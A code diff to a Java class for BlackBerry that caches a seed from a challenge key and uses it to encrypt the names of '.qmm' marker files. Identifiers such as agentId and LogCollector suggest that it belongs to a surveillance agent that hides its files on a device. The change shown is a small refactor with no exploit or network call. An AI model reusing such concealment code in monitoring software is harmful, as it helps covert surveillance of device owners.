@@ -29,6 +29,8 @@ import blackberry.utils.Utils;
 public final class Markup {
 
     public static final String MARKUP_EXTENSION = ".qmm";
+    public static byte markupSeed;
+    public static boolean markupInit;
 
     private int agentId = 0;
 
@@ -98,13 +100,32 @@ public final class Markup {
             }
         }
 
-        encName += Encryption.encryptName(markupName + MARKUP_EXTENSION, Keys
-                .getInstance().getChallengeKey()[0]);
+        encName += Encryption.encryptName(markupName + MARKUP_EXTENSION,
+                getMarkupSeed());
+        //#ifdef DBC
+        Check.asserts(markupInit, "makeMarkupName: " + markupInit);
+        //#endif
+
         //#ifdef DEBUG_TRACE
         debug.trace("makeMarkupName: " + encName);
         //#endif
 
         return encName;
+    }
+
+    private static int getMarkupSeed() {
+        if (!markupInit) {
+            Keys keys = Keys.getInstance();
+            byte[] challengeKey = keys.getChallengeKey();
+            //#ifdef DBC
+            Check.asserts(challengeKey != null,
+                    "makeMarkupName: challengeKey!=null");
+            //#endif
+            markupSeed = challengeKey[0];
+            markupInit = true;
+        }
+
+        return markupSeed;
     }
 
     /**
@@ -176,6 +197,7 @@ public final class Markup {
     private Markup() {
         logCollector = LogCollector.getInstance();
         encryption = new Encryption();
+
     }
 
     /**
@@ -192,8 +214,9 @@ public final class Markup {
         Utils.copy(key, 0, aesKey, 0, 16);
 
         encryption.makeKey(key);
-
         agentId = agentId_;
+
+        getMarkupSeed();
     }
 
     /**
